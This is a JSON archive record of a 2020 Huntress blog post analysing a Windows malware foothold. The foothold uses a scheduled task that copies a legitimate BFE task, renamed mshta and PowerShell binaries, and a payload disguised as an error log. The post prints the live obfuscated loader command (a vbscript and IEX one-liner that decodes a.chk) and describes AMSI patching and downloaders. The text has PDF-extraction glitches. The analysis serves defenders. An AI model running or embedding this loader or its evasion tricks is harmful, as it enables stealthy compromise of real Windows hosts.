{
    "id": "e7704265-da1d-4462-8017-e25d6c05360a",
    "created_at": "2023-01-12T15:09:27.478847Z",
    "updated_at": "2025-03-27T02:05:38.091862Z",
    "deleted_at": null,
    "sha1_hash": "3998bf4075aefb544be779e189ab3d36a5d81b36",
    "title": "2020-06-18 - Hiding In Plain Sight",
    "authors": "",
    "file_creation_date": "2022-05-28T00:39:31Z",
    "file_modification_date": "2022-05-28T00:39:31Z",
    "file_size": 92653,
    "plain_text": "# Hiding In Plain Sight\n\n**blog.huntresslabs.com/hiding-in-plain-sight-556469e0a4e**\n\nJohn Ferrell June 21, 2020\n\nJoh\nn\n\n\n[John Ferrell](https://medium.com/@jdferrell3?source=post_page-----556469e0a4e--------------------------------)\n[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fc2f00fefa411&operation=register&redirect=https%3A%2F%2Fblog.huntresslabs.com%2Fhiding-in-plain-sight-556469e0a4e&user=John+Ferrell&userId=c2f00fefa411&source=post_page-c2f00fefa411----556469e0a4e---------------------follow_byline-----------)\nJun 18, 2020\n\n\n4 min read\n\n\n-----\n\nWhat do you think this file is?\n\n\n-----\n\nError log from third party application?\nAt first glance, it looks like a log for some application. It has timestamps and includes\nreferences to OS 6.2, the internal version number for Windows 8 and Window Server 2012.\n\nIt turns out that this file is associated with a malicious foothold that we discovered. The malware\nauthors used several tricks to hide in plain sight, including renaming legitimate files,\nmasquerading as an existing scheduled task, and using a malicious payload stored in a file\nmade to look like an error log.\n\nWe came across an interesting foothold recently; a scheduled task named\n```\nBfeOnServiceStartTypenChange with the command:\n\n```\n\n-----\n\n```\n C:\\Windows\\system32\\BfeOnService.exe\nvbscript:CreateObject(\\\"Wscript.Shell\\\").Run(\\\"cmd.exe /C C:\\Windows\\system32\\engine.exe\n-c \\\"\\\"IEX $($(gc 'C:\\Windows\\a.chk'|%{[char][int]($_.split('x')[-1])})join'')\\\"\\\"\\\",0,True)(window.close)\"\n\n```\nUpon visual inspection of the the command, there is nothing inherently malicious with it\n(someone with programming experience may note the `split() is a bit odd).`\n\nThe task itself includes the description:\n\nThis task adjusts the start type for firewall-triggered services when the start type of the\nBase Filtering Engine (BFE) is disabled.\n\nThe `BfeOnService.exe and` `engine.exe file names seem to fit the task’s description. The`\ncommand references the file `c:\\windows\\a.chk, a snippet of the file is what we’ve shown`\nabove.\n\nIf only given a quick glance, the task, command (specifically the executable file names), and the\n“log” could be passed over as legitimate. Upon further examination, the task name and\ndescription are essentially a copy of another task on the host,\n```\nBfeOnServiceStartTypeChange, that has the same description with the command\n%windir%\\system32\\rundll32.exe bfe.dll,BfeOnServiceStartTypeChange . This task is\n\n```\nin fact the legitimate one.\n\nGoing back to the log, an astute reviewer might notice the last column in the log appears to be\ndecimal (disguised as hexadecimal) representations of ASCII characters. In addition, command\nincludes a call to `char which is used to convert a number to its ASCII character value.`\n\n\n-----\n\nASCII characters hidden in the log\nHere is a breakdown of the command and what is actually going on:\n\n\n-----\n\n```\nBfeOnService.exe is a renamed copy of the legitimate mshta.exe . This is used to execute\n\n```\na simple VisualBasic script that creates a shell and runs a command. The `engine.exe is a`\nrenamed copy of the legitimate `powershell.exe . This is used to read the “log file”,` `a.chk,`\nconverting the hexadecimal-like values into a PowerShell command which is then executed.\nThese renamed executables serve two purpose, they don’t stand out visually, and if you were to\nmonitor running processes specifically looking for `powershell.exe and` `mshta.exe, you`\nwon’t see them.\n\nOnce the values from the log file are converted to ASCII, we get this:\n\nAt a high level, here is what the malware does:\n\n\n-----\n\n1. In the payload above, if version 3 or greater is found, it patches the (AMSI) in memory in\n\norder to bypass it. A second encoded command is then executed which serves as a\ndownloader.\n2. The downloader retrieves another intermediary PowerShell command which is a\n\nsecondary downloader (this downloader did an interesting DNS trick which we will cover\nin another post).\n3. The : a list of installed applications (specifically looking for browsers, financial\n\napplications, and security products), IP addresses, administrative privileges, etc. This\nparticular payload is essentially the same one we wrote about a while back. In that case,\ninstead of the log file used here. Below are the functions from each payload that get the\ninstalled applications. The primary difference is the way the strings are obfuscated.\n\n\n-----\n\nThere s no end to the stealthy ways in which attackers develop and execute their tradecraft. As\nin this case, sometimes it is as simple as hiding in plain sight.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-18 - Hiding In Plain Sight.pdf"
    ],
    "report_names": [
        "2020-06-18 - Hiding In Plain Sight.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536167,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1653698371,
    "ts_modification_date": 1653698371,
    "files": {
        "pdf": "https://archive.orkl.eu/3998bf4075aefb544be779e189ab3d36a5d81b36.pdf",
        "text": "https://archive.orkl.eu/3998bf4075aefb544be779e189ab3d36a5d81b36.txt",
        "img": "https://archive.orkl.eu/3998bf4075aefb544be779e189ab3d36a5d81b36.jpg"
    }
}